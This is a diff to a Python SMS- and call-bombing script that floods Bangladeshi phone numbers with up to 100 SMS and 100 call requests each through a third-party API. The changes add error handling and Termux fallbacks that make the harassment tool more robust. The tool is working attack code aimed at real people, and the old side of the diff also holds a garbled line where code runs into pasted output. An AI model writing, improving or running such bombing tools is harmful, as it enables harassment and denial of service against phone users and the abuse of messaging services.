@@ -42,7 +42,10 @@ USER_AGENTS = [
 ]
 
 def clear_screen():
-    os.system("clear" if os.name == "posix" else "cls")
+    try:
+        os.system("clear" if os.name == "posix" else "cls")
+    except Exception:
+        print("\n" * 50)  # Fallback for Termux issues
 
 def validate_phone(phone):
     return phone.strip().isdigit() and len(phone.strip()) == 11 and phone.strip().startswith("01")
@@ -55,7 +58,6 @@ def send_request(phone, request_type):
     try:
         response = requests.get(url, params=params, headers=headers, timeout=10)
         print(f"{Colors.YELLOW}Debug: Raw API response for {request_type.upper()} to {phone}: {response.text}{Colors.RESET}")
-        # Mark as Success regardless of HTTP status, as request was sent
         return {"success": True, "status": f"Success (HTTP {response.status_code})"}
     except requests.RequestException as e:
         return {"success": False, "status": f"Unsuccessful: {str(e)}"}
@@ -64,29 +66,38 @@ def main():
     clear_screen()
     print(SM_ART)
     
-    # Phone numbers input (comma-separated)
-    phone_input = input(f"{Colors.CYAN}Enter Bangladeshi numbers (e.g., 01712345678,01987654321): {Colors.RESET}").strip()
-    phone_numbers = [phone.strip() for phone in phone_input.split(",")]
-    
-    # Validate all phone numbers
-    for phone in phone_numbers:
-        if not validate_phone(phone):
-            print(f"{Colors.RED}Invalid number {phone}! Must be 11 digits starting with 01.{Colors.RESET}")
+    # Phone numbers input
+    try:
+        phone_input = input(f"{Colors.CYAN}Enter Bangladeshi numbers (e.g., 01712345678,01987654321): {Colors.RESET}").strip()
+        phone_numbers = [phone.strip() for phone in phone_input.split(",") if phone.strip()]
+        
+        # Validate phone numbers
+        if not phone_numbers:
+            print(f"{Colors.RED}No valid numbers entered!{Colors.RESET}")
             input("Press Enter to exit...")
             return
+        for phone in phone_numbers:
+            if not validate_phone(phone):
+                print(f"{Colors.RED}Invalid number {phone}! Must be 11 digits starting with 01.{Colors.RESET}")
+                input("Press Enter to exit...")
+                return
+    except Exception as e:
+        print(f"{Colors.RED}Error in phone input: {str(e)}{Colors.RESET}")
+        input("Press Enter to exit...")
+        return
 
     # Count input for SMS and Calls
     try:
         sms_count = int(input(f"{Colors.CYAN}Enter number of SMS requests per number (0-100): {Colors.RESET}").strip())
         call_count = int(input(f"{Colors.CYAN}Enter number of Call requests per number (0-100): {Colors.RESET}").strip())
         if not (0 <= sms_count <= 100 and 0 <= call_count <= 100):
-            raise ValueError
+            raise ValueError("Counts must be between 0 and 100")
         if sms_count == 0 and call_count == 0:
             print(f"{Colors.RED}Both SMS and Call counts cannot be 0!{Colors.RESET}")
             input("Press Enter to exit...")
             return
-    except ValueError:
-        print(f"{Colors.RED}Invalid count! Must be between 0 and 100.{Colors.RESET}")
+    except ValueError as e:
+        print(f"{Colors.RED}Invalid count! {str(e)}{Colors.RESET}")
         input("Press Enter to exit...")
         return
 
@@ -94,9 +105,9 @@ def main():
     try:
         delay = float(input(f"{Colors.CYAN}Enter delay between requests (seconds, e.g., 2): {Colors.RESET}").strip())
         if delay < 0:
-            raise ValueError
-    except ValueError:
-        print(f"{Colors.RED}Invalid delay! Must be a non-negative number.{Colors.RESET}")
+            raise ValueError("Delay must be non-negative")
+    except ValueError as e:
+        print(f"{Colors.RED}Invalid delay! {str(e)}{Colors.RESET}")
         input("Press Enter to exit...")
         return
 
@@ -107,17 +118,31 @@ def main():
 
     request_counter = 0
     for phone in phone_numbers:
-        # Create request list for this number
         request_list = [("sms", API) for _ in range(sms_count)] + [("call", API) for _ in range(call_count)]
         random.shuffle(request_list)
 
         print(f"\n{Colors.CYAN}Bombing number: {phone}{Colors.RESET}")
         for request_type, _ in request_list:
             request_counter += 1
-            result = send_request(phone, request_type)
-            if result["success"]:
-                print(f"{Colors.GREEN}[{request_counter}/{total_requests}] {API['name']} ({request_type.upper()} to {phone}): {result['status']}{Colors.RESET}")
-            else:
-                print(f"{Colors.RED}[{request_counter}/{total_requests}] {API['name']} ({request_type ('SMS to 01712345678): Success (HTTP 200)
+            try:
+                result = send_request(phone, request_type)
+                if result["success"]:
+                    print(f"{Colors.GREEN}[{request_counter}/{total_requests}] {API['name']} ({request_type.upper()} to {phone}): {result['status']}{Colors.RESET}")
+                else:
+                    print(f"{Colors.RED}[{request_counter}/{total_requests}] {API['name']} ({request_type.upper()} to {phone}): {result['status']}{Colors.RESET}")
+            except Exception as e:
+                print(f"{Colors.RED}[{request_counter}/{total_requests}] {API['name']} ({request_type.upper()} to {phone}): Unsuccessful: {str(e)}{Colors.RESET}")
+            time.sleep(delay + random.uniform(0, 1))
 
-SMS and Call bombing completed successfully!
+    print(f"\n{Colors.GREEN}SMS and Call bombing completed successfully!{Colors.RESET}")
+    input("Press Enter to exit...")
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{Colors.RED}Stopped by user.{Colors.RESET}")
+        sys.exit(0)
+    except Exception as e:
+        print(f"{Colors.RED}Unexpected error: {str(e)}{Colors.RESET}")
+        input("Press Enter to exit...")
